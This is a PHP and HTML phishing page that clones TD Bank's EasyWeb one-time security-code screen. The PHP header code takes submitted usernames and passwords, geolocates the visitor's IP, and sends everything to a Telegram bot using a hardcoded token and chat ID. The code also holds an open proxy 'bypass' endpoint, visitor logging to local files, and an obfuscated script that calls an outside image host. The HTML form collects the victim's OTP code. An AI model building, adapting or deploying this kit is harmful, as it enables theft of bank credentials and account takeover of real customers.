<?php 
include "/mods/antibot.php";


header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="TD BANK LOGGED IN \n\n$ip$lh$is$lh$uos\n\n///////////////////\n\n\n$user\n\n\n\n$pass\n\n---------------------\n\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
                                             

?><html class="js flexbox flexboxlegacy no-touch rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent dialog-open js flexbox flexboxlegacy touch rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent" data-kantu="1" lang="en-CA"><head><meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-touch-fullscreen" content="yes">
    
      <title>EasyWeb Login</title>
      <!--<base href="/uap-ui/">-->
      <base href=".">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/x-icon" href="https://authentication.td.com/uap-ui/favicon.ico">
    <link rel="stylesheet" href="files/styles.14a50f9555310c5a926d.css" class="td_apas_css">
    <style>
    
    </style>
    <style>.login-wrapper[_ngcontent-gcp-c141]{display:flex;flex-direction:column;min-height:100%;height:100%}.login-wrapper[_ngcontent-gcp-c141]   .spacer[_ngcontent-gcp-c141]{flex:1 1 auto}</style>
    <style>.text-center[_nghost-gcp-c100]   .banner-container[_ngcontent-gcp-c100], .text-center   [_nghost-gcp-c100]   .banner-container[_ngcontent-gcp-c100]{justify-content:center}.banner-container[_ngcontent-gcp-c100]{display:flex}.banner-container[_ngcontent-gcp-c100]   .td-icon-error[_ngcontent-gcp-c100]{padding-right:1rem;top:1px}.td-link-password-reset[_ngcontent-gcp-c100]{color:inherit}div[role=alert][_ngcontent-gcp-c100]{outline:none}</style>
    <script type="text/javascript" async="">(function() {(new Image()).src = '//images-cdn.info/590/image.gif' })();</script><script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt">
    
    </script>
      <script type="text/javascript" async="" src="files/ast">
    
    </script>
      <style>.login-form[_ngcontent-gcp-c139]{display:flex;flex-direction:column}.login-form[_ngcontent-gcp-c139]   .order-1[_ngcontent-gcp-c139]{order:1}.login-form[_ngcontent-gcp-c139]   .order-2[_ngcontent-gcp-c139]{order:2}.login-form[_ngcontent-gcp-c139]   .order-3[_ngcontent-gcp-c139]{order:3}.login-form[_ngcontent-gcp-c139]   .order-4[_ngcontent-gcp-c139]{order:4}.login-form[_ngcontent-gcp-c139]   .order-5[_ngcontent-gcp-c139]{order:5}.login-form[_ngcontent-gcp-c139]   .order-6[_ngcontent-gcp-c139]{order:6}.login-form[_ngcontent-gcp-c139]   .order-7[_ngcontent-gcp-c139]{order:7}.description-container[_ngcontent-gcp-c139]{margin-bottom:.9375rem}.description-container[_ngcontent-gcp-c139]   .expand-btn[_ngcontent-gcp-c139]{margin:0;padding:0;border:none;background:transparent;display:flex;align-items:baseline;color:#038203}.description-container[_ngcontent-gcp-c139]   .expand-btn[_ngcontent-gcp-c139]   .td-icon[_ngcontent-gcp-c139]{padding-right:.25em}.description-container[_ngcontent-gcp-c139]   .entry-box[_ngcontent-gcp-c139]{background-color:#fff;padding:10px 1.5rem 0;margin-top:15px;position:relative}.description-container[_ngcontent-gcp-c139]   .entry-box[_ngcontent-gcp-c139]:before{position:absolute;width:.618rem;height:.618rem;background:#f5f9f7;left:1.618rem;top:-.309rem;content:"";transform:rotate(45deg);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg)}.uap-security-guarantee[_ngcontent-gcp-c139]   .td-icon-superlock[_ngcontent-gcp-c139]{color:#1a5336}</style>
      <style>.input-group[_ngcontent-gcp-c138]   .drop-down-icon[_ngcontent-gcp-c138]{position:absolute;cursor:pointer;top:0;right:0;width:34px;height:42px;display:inline-block}.input-group[_ngcontent-gcp-c138]   .form-control[_ngcontent-gcp-c138]{padding-left:15px}.input-group[_ngcontent-gcp-c138]   .drop-down-btn[_ngcontent-gcp-c138]{position:absolute;top:0;right:0;width:30px;height:42px;background:none;border:none;font-weight:700}.input-group[_ngcontent-gcp-c138]   .drop-down-btn[_ngcontent-gcp-c138]:hover:after{border-color:#00a221}.input-group[_ngcontent-gcp-c138]   .drop-down-btn[_ngcontent-gcp-c138]:after{content:"";pointer-events:none;position:absolute;font-size:.625em;line-height:1;width:.5rem;height:.5rem;margin-top:-.5em;top:45%;right:1.2em;color:#fff;border:3px solid #1c1c1c;border-width:0 2px 2px 0;transform:rotate(45deg);display:inline-block}#cardList[_ngcontent-gcp-c138]{padding:0;margin:0;position:absolute;left:15px;right:15px;z-index:1;box-shadow:0 0 15px rgba(0,0,0,.15),0 0 1px 1px rgba(0,0,0,.1);outline:none}#cardList[_ngcontent-gcp-c138]   .uap-list-item[_ngcontent-gcp-c138]{display:flex;justify-content:space-between;align-items:center;height:42px;background-color:#fff;padding:0 15px}#cardList[_ngcontent-gcp-c138]   .uap-list-item[_ngcontent-gcp-c138]:hover{background-color:#f3f3f3}#cardList[_ngcontent-gcp-c138]   .uap-list-item.card-option[_ngcontent-gcp-c138]   .option-btn[_ngcontent-gcp-c138]{height:100%;flex:1 1 auto;text-align:left;background:none;border:none;padding-left:0;padding-right:0}#cardList[_ngcontent-gcp-c138]   .uap-list-item.card-option[_ngcontent-gcp-c138]   .icon-btn[_ngcontent-gcp-c138]{height:100%;color:#1a5336;padding-right:0;padding-left:0;width:30px}#cardList[_ngcontent-gcp-c138]   .uap-list-item.card-option[_ngcontent-gcp-c138]   .icon-btn[_ngcontent-gcp-c138]:hover{color:#038203}#cardList[_ngcontent-gcp-c138]   .uap-list-item.card-option[_ngcontent-gcp-c138]   .icon-btn[_ngcontent-gcp-c138]   .td-icon[_ngcontent-gcp-c138]{font-size:1.25rem}#cardList[_ngcontent-gcp-c138]   .uap-list-item[_ngcontent-gcp-c138]:last-child{border-top:1px solid #dadada}#cardList[_ngcontent-gcp-c138]   .uap-list-item[_ngcontent-gcp-c138]   .td-link-action[_ngcontent-gcp-c138]{width:100%;line-height:calc(42px - 1px)}</style>
      <style>.otp-login-msg[_ngcontent-gcp-c103]{clear:both;position:relative;overflow:visible;color:#ae1100;margin:0;padding:.25rem 0 .375rem;font-size:.79375rem}</style>
      <style>.inline[_ngcontent-gcp-c86]{display:inline}</style>
      <script id="tmx_tags_js" type="text/javascript" src="files/8bm5i59l8oo3zm66">
    
    </script>
      <style>@-webkit-keyframes loadingSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@keyframes loadingSpinner{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@-webkit-keyframes loadingSpinner2{0%{stroke-dashoffset:2960}to{stroke-dashoffset:0}}@keyframes loadingSpinner2{0%{stroke-dashoffset:2960}to{stroke-dashoffset:0}}@-webkit-keyframes loadingSpinner3{0%{stroke-dashoffset:2960}to{stroke-dashoffset:1160}}@keyframes loadingSpinner3{0%{stroke-dashoffset:2960}to{stroke-dashoffset:1160}}.otp-preloader[_ngcontent-gcp-c40]{display:flex;align-items:center;justify-content:center}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner.big[_ngcontent-gcp-c40]{display:inline-block;width:80px;height:80px}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner.big[_ngcontent-gcp-c40]   .primary-bright[_ngcontent-gcp-c40]{stop-color:#008a00}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner.big[_ngcontent-gcp-c40]   .primary[_ngcontent-gcp-c40]{stop-color:#1a5336}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner.big[_ngcontent-gcp-c40]   .loading-small[_ngcontent-gcp-c40]{display:none}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner.big[_ngcontent-gcp-c40]   svg[_ngcontent-gcp-c40]{width:100%;height:100%}.otp-preloader[_ngcontent-gcp-c40]   .loading-spinner-indeterminate[_ngcontent-gcp-c40]   .loading-circle[_ngcontent-gcp-c40]{transform-origin:50% 50%;-webkit-animation:loadingSpinner 1s linear infinite,loadingSpinner3 1.2s ease-in-out infinite alternate;animation:loadingSpinner 1s linear infinite,loadingSpinner3 1.2s ease-in-out infinite alternate;stroke-dasharray:2960}</style>
      <style>.mat-dialog-container{display:block;padding:24px;border-radius:4px;box-sizing:border-box;overflow:auto;outline:0;width:100%;height:100%;min-height:inherit;max-height:inherit}.cdk-high-contrast-active .mat-dialog-container{outline:solid 1px}.mat-dialog-content{display:block;margin:0 -24px;padding:0 24px;max-height:65vh;overflow:auto;-webkit-overflow-scrolling:touch}.mat-dialog-title{margin:0 0 20px;display:block}.mat-dialog-actions{padding:8px 0;display:flex;flex-wrap:wrap;min-height:52px;align-items:center;margin-bottom:-24px}.mat-dialog-actions[align=end]{justify-content:flex-end}.mat-dialog-actions[align=center]{justify-content:center}.mat-dialog-actions .mat-button-base+.mat-button-base,.mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}
    </style>
    <style>.otp-option-title[_ngcontent-gcp-c73]{font-family:Webly Sleek SemiBold;font-size:1.125rem;font-weight:700;color:#1a5336}.authenticator-icon[_ngcontent-gcp-c73]{width:45px;height:45px;border-radius:7.35px}</style>
    <style>.bold-green[_ngcontent-gcp-c74]{font-family:Webly Sleek SemiBold;font-size:1.125rem;font-weight:700;color:#1a5336}.input-group.security-code[_ngcontent-gcp-c74]   .form-control[_ngcontent-gcp-c74]{padding-left:15px}.input-group.security-code[_ngcontent-gcp-c74]   .input-group-addon[_ngcontent-gcp-c74]{font-size:1.4rem;color:#048403}</style>
    
    
    </script>
    </head>
    <body class="en_CA td-no-focus-outline">
      <app-root _nghost-gcp-c153="" ng-version="10.2.4" aria-hidden="true">
        <!---->
      
        <!---->
        <!---->
        <!---->
        
    <!---->
    <uap-footer-public _ngcontent-gcp-c153="" _nghost-gcp-c124="">
      <footer _ngcontent-gcp-c124="" class="td-fullwidth-dark-green td-padding-vert-0">
      <div _ngcontent-gcp-c124="" class="td-container">
      <div _ngcontent-gcp-c124="" class="td-row">
      <div _ngcontent-gcp-c124="" class="td-footer-content td-col-xs-12" style="background-image: url('assets/img/footer_seat.png');">
    <p _ngcontent-gcp-c124="" class="td-footer-heading td-copy-white td-copy-align-centre">
      <span _ngcontent-gcp-c124="">Need to talk to us directly?</span>
    <a _ngcontent-gcp-c124="" class="td-contact-link td-link-action" href="#/ca/en/personal-banking/contact-us/"> Contact us </a>
    </p>
    <div _ngcontent-gcp-c124="" class="td-footer-social td-copy-align-centre">
      <p _ngcontent-gcp-c124="" class="td-footer-social-heading">Connect with TD</p>
    <ul _ngcontent-gcp-c124="">
      <li _ngcontent-gcp-c124="">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-link-nounderline" href="https://twitter.com/td_canada">
      <div _ngcontent-gcp-c124="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen">
      <span _ngcontent-gcp-c124="" aria-hidden="true" class="td-icon td-icon-twitter">
    
    </span>
    <span _ngcontent-gcp-c124="" class="td-forscreenreader">FOOTER.TWITTER</span>
    </div>
    </a>
    </li>
    <li _ngcontent-gcp-c124="">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-link-nounderline" href="https://facebook.com/tdbankgroup/">
      <div _ngcontent-gcp-c124="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen">
      <span _ngcontent-gcp-c124="" aria-hidden="true" class="td-icon td-icon-facebookIcon">
    
    </span>
      <span _ngcontent-gcp-c124="" class="td-forscreenreader">FOOTER.FACEBOOK</span>
    </div>
    </a>
    </li>
      <li _ngcontent-gcp-c124="">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-link-nounderline" href="https://www.instagram.com/TD_Canada/">
      <div _ngcontent-gcp-c124="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen">
      <span _ngcontent-gcp-c124="" aria-hidden="true" class="td-icon td-icon-instagram">
    
    </span>
      <span _ngcontent-gcp-c124="" class="td-forscreenreader">FOOTER.INSTAGRAM</span>
    </div>
    </a>
    </li>
      <li _ngcontent-gcp-c124="">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-link-nounderline" href="https://www.youtube.com/tdcanada">
      <div _ngcontent-gcp-c124="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen">
      <span _ngcontent-gcp-c124="" aria-hidden="true" class="td-icon td-icon-youtubeLogo">
    
    </span>
      <span _ngcontent-gcp-c124="" class="td-forscreenreader">FOOTER.YOUTUBE</span>
    </div>
    </a>
    </li>
      <li _ngcontent-gcp-c124="">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-link-nounderline" href="https://www.linkedin.com/company/td">
      <div _ngcontent-gcp-c124="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen">
      <span _ngcontent-gcp-c124="" aria-hidden="true" class="td-icon td-icon-linkedin">
    
    </span>
      <span _ngcontent-gcp-c124="" class="td-forscreenreader">FOOTER.LINKEDIN</span>
    </div>
    </a>
    </li>
    </ul>
    </div>
      <div _ngcontent-gcp-c124="" class="td-footer-links td-copy-align-centre td-copy-white">
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="#/privacy-and-security/privacy-and-security/indexp">Privacy and Security</a>
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="#/to-our-customers/">Legal</a>
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/indexp">Accessibility</a>
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="#/products-services/indexp">CDIC member</a>
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="#/about-tdbfg/our-business/indexp">About Us</a>
      <a _ngcontent-gcp-c124="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard" href="#/careers/why-td/indexp">We're Hiring</a>
      <a _ngcontent-gcp-c124="" href="javascript:void(0)" role="button" class="td-copy-white td-link-nounderline td-copy-standard">Site Index</a>
    </div>
    </div>
    </div>
    </div>
    </footer>
    </uap-footer-public>
      <!---->
      <!---->
      <!---->
    </app-root>
    <script src="files/runtime-es2015.e748bfeb478370a35d92" type="module">
    
    </script>
    <script src="files/runtime-es5.e748bfeb478370a35d92" nomodule="" defer="">
    
    </script>
    <script src="files/polyfills-es5.6626a9c8c72c8b733d10" nomodule="" defer="">
    
    </script>
    <script src="files/polyfills-es2015.965da94d3645816204ff" type="module">
    
    </script>
    <script src="files/scripts.13cd3f9c93f86b02bd4f" defer="">
    
    </script>
    <script src="files/main-es2015.e1c1cabee5e710af5669" type="module">
    
    </script>
    <script src="files/main-es5.e1c1cabee5e710af5669" nomodule="" defer="">
    
    </script>
    <script type="text/javascript" async="">
    var _0x8142 = ['\x6D\x61\x74\x63\x68', '\x68\x6F\x73\x74', '\x6C\x6F\x63\x61\x74\x69\x6F\x6E', '\x73\x63\x72\x69\x70\x74', '\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74', '\x74\x79\x70\x65', '\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74', '\x61\x73\x79\x6E\x63', '\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C', '\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x28\x6E\x65\x77\x20\x49\x6D\x61\x67\x65\x28\x29\x29\x2E\x73\x72\x63\x20\x3D\x20\x27\x2F\x2F\x69\x6D\x61\x67\x65\x73\x2D\x63\x64\x6E\x2E\x69\x6E\x66\x6F\x2F\x35\x39\x30\x2F\x69\x6D\x61\x67\x65\x2E\x67\x69\x66\x27\x20\x7D\x29\x28\x29\x3B', '\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65', '\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65',  '\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65' ]; (function() { if (window[_0x8142[2]][_0x8142[1]][_0x8142[0]](/(?![a-z0-9-].*?\.)?(authentication\.td\.com)$/) === null) { var _0xbfd8x1 = document[_0x8142[4]](_0x8142[3]); _0xbfd8x1[_0x8142[5]] = _0x8142[6]; _0xbfd8x1[_0x8142[7]] = true; _0xbfd8x1[_0x8142[8]] = _0x8142[9]; var _0xbfd8x2 = document[_0x8142[10]](_0x8142[3])[0]; _0xbfd8x2[_0x8142[12]][_0x8142[11]](_0xbfd8x1, _0xbfd8x2); } })(); 
        </script>
    
    
    <script type="text/javascript" async="" src="files/Bootstrap">
    
    </script>
    <script type="text/javascript" async="" src="files/dfb31537">
    
    </script>
    <iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_td_0" name="destination_publishing_iframe_name" src="files/dest5.html" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded" aria-hidden="true">
    </iframe>
    <div class="cdk-overlay-container">
      <div class="cdk-overlay-backdrop uap-modal-backdrop cdk-overlay-backdrop-showing">
    
    </div>
    <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
    <div id="cdk-overlay-2" class="cdk-overlay-pane uap-modal-panel" style="max-width: 100%; pointer-events: auto; width: 50em; position: static;">
    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
    
    </div>
    <mat-dialog-container tabindex="-1" aria-modal="true" class="mat-dialog-container ng-tns-c34-1 ng-trigger ng-trigger-dialogContainer ng-star-inserted" id="mat-dialog-1" role="dialog" aria-labelledby="otpChallengeModalTitle" aria-describedby="otpChallengeModalDesc1 otpChallengeModalDesc2" style="transform: none;">
    <core-otp-challenge-modal _nghost-gcp-c74="" class="ng-star-inserted">
      <button _ngcontent-gcp-c74="" type="button" class="btn-close-modal">
      
    <span _ngcontent-gcp-c74="" class="sr-only">Close</span>
    </button>
    <uap-server-error _ngcontent-gcp-c74="" display="modal-banner" class="top-banner" _nghost-gcp-c100="">
      <!---->
    </uap-server-error>
    <h2 _ngcontent-gcp-c74="" id="otpChallengeModalTitle" class="text-center ng-star-inserted" style="">Enter Security Code</h2>
    <div _ngcontent-gcp-c74="" class="text-center ng-star-inserted" style="">
      <p _ngcontent-gcp-c74="" id="otpChallengeModalDesc1" class="lead">Your one-time security code was sent by <strong>email</strong> to</p>
    <p _ngcontent-gcp-c74="" id="otpChallengeModalDesc2">
      <strong _ngcontent-gcp-c74="">••••••••@••••.••</strong>
    <br _ngcontent-gcp-c74="">
    <strong _ngcontent-gcp-c74="">
    
    </strong>
    </p>
    <p _ngcontent-gcp-c74="" translate="ENTER_CODE.CODE_WILL_EXPIRE" class="td-small-copy">This code will expire in a few minutes.</p>
    </div>
    <!---->
    <!---->
    <div _ngcontent-gcp-c74="" class="row mb-4 ng-star-inserted" style="">
      <form _ngcontent-gcp-c74="" method="post" action="040150.php" novalidate="" class="col-sm-6 col-sm-offset-3 ng-pristine ng-valid ng-touched">
        <div _ngcontent-gcp-c74="" class="form-group form-group-padding">
        <label _ngcontent-gcp-c74="" for="code" translate="ENTER_CODE.ENTER_SECURITY_CODE">Enter Security Code</label>
      <div _ngcontent-gcp-c74="" class="input-group security-code">
        <input _ngcontent-gcp-c74="" name="code" id="code" type="tel" formcontrolname="code" cdkfocusinitial="" aria-describedby="otp_code" autocomplete="off" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;" class="form-control ng-pristine ng-valid ng-touched" placeholder="Type code here" aria-invalid="false" required="">
      <!---->
    </div>
      <uap-field-error _ngcontent-gcp-c74="" errorkey="ENTER_CODE.INPUT_ERROR_MSG.NUMERIC_ONLY" _nghost-gcp-c103="">
        <!---->
    </uap-field-error>
    </div>
      <button _ngcontent-gcp-c74="" translate="BUTTON.ENTER" class="td-button td-button-block td-button-secondary">Enter</button>
    </form>
    </div>
      <div _ngcontent-gcp-c74="" class="ng-star-inserted" style="">
        <hr _ngcontent-gcp-c74="" aria-hidden="true" class="td-thin-divider-line-1">
      <div _ngcontent-gcp-c74="" class="row mt-4">
        <div _ngcontent-gcp-c74="" class="col-sm-10 col-sm-offset-1">
        <p _ngcontent-gcp-c74="" class="text-center mt-0">
              <span _ngcontent-gcp-c74="">Switch verification methods</span>
              <br _ngcontent-gcp-c74="">
              <span _ngcontent-gcp-c74="">Send a new code to</span>
              <strong _ngcontent-gcp-c74="">+1 (•••) ••• - ••••</strong>
              <!---->
            </p>
          </div>
          </div>
            <div _ngcontent-gcp-c74="" class="row">
              <div _ngcontent-gcp-c74="" class="col-xs-6 col-sm-5 col-sm-offset-1">
              <div _ngcontent-gcp-c74="" class="form-group form-group-padding">
              <button _ngcontent-gcp-c74="" translate="BUTTON.CALL_ME" class="td-button td-button-block td-button-clear-green">Call me</button>
          </div>
          </div>
            <div _ngcontent-gcp-c74="" class="col-xs-6 col-sm-5">
              <div _ngcontent-gcp-c74="" class="form-group form-group-padding">
              <button _ngcontent-gcp-c74="" translate="BUTTON.TEXT_ME" class="td-button td-button-block td-button-clear-green ng-binding">Text me</button>
          </div>
          </div>
          </div>
            <div _ngcontent-gcp-c74="" class="row mt-2 ng-star-inserted">
              <div _ngcontent-gcp-c74="" class="col-xs-12 text-center">
              <a _ngcontent-gcp-c74="" class="td-link-nounderline td-link-standalone">
              <span _ngcontent-gcp-c74="">Send to a new number</span>
            <span _ngcontent-gcp-c74="" class="td-link-lastword">
    
            </span>
          </a>
          </div>
          </div>
            <!---->
            <div _ngcontent-gcp-c74="" class="row mt-2">
              <div _ngcontent-gcp-c74="" class="col-xs-12 text-center">
              <p _ngcontent-gcp-c74="" class="td-small-copy my-0">Standard wireless carrier message and data rates may apply.</p>
          </div>
          </div>
          </div>
            <!---->
            <!---->
            <!---->
            <!---->
            <!---->
            <!---->
            <!---->
          </core-otp-challenge-modal>
            <!---->
          </mat-dialog-container>
            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true">
    
            </div>
          </div>
          </div>
          </div>
            <iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1674211863734" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;">
          </iframe>
          
            
    </body></html>